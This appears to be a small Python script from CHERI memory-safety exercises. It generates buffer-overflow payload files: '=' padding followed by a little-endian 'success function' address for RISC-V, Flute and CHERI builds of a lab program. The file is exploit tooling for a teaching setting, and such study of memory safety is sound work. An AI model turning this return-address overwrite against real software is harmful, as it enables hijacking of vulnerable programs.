configurations = { 
        # 'risc':        '481F010000000000', # success function address = 0x011F48
        # 'risc_flute':  '481F010000000000', # success function address = 00000000800002a4
        # 'cheri':       '3C22100000000000'  # success function address = 0x10223C
        'risc':        0x011F48, 
        'risc_flute':  0x800002a4, 
        'cheri':       0x10223C
        }

def produce_payload(success_addr, number_of_equals=19):
    s = ('0' * (16 - len(hex(success_addr)[2:])) + hex(success_addr)[2:])
    addr_cookiefied = ''.join(s[i*2] + s[i*2+1] for i in reversed(range(len(s[::-1])//2)))
    return '=' * number_of_equals + addr_cookiefied

for arch, addr in configurations.items():
    with open(f'payload_{arch}.txt', 'w') as f:
        f.write( produce_payload(addr) ) 

# :!python3 % && copy_to_cheri.sh payload_risc.txt /cheri-exercises && copy_to_cheri.sh payload_cheri.txt /cheri-exercises


